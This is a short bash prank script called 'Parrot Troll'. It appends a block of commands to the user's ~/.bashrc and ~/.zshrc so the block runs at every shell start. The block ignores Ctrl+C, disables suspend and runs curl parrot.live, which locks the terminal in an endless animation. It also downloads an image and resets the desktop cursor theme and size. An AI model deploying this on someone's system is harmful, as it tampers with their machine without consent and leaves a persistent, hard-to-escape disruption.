#!/bin/bash

PARROT_TROLL=$(cat << 'EOF'
trap '' 2
stty susp undef
curl parrot.live
mkdir -p ~/.icons/parrot-cursor/
cd ~/.icons/parrot-cursor
wget http://www.rw-designer.com/cursor-view/103249.png -O parrot-cursor.png
gsettings set org.gnome.desktop.interface cursor-theme 'parrot-cursor'
gsettings set org.gnome.desktop.interface cursor-size 66
export XCURSOR_THEME="parrot-cursor"
export XCURSOR_SIZE="66"
EOF
)

append_parrot_troll() {
    local file="$1"
    if [ -f "$file" ]; then
        if ! grep -q "$PARROT_TROLL" "$file"; then
            echo "$PARROT_TROLL" >> "$file"
            echo "Parrot Troll 🦜 added to $file"
		else
			echo "Parrot Troll 🦜 already nested in $file"
        fi
    fi
}

append_parrot_troll ~/.bashrc
append_parrot_troll ~/.zshrc
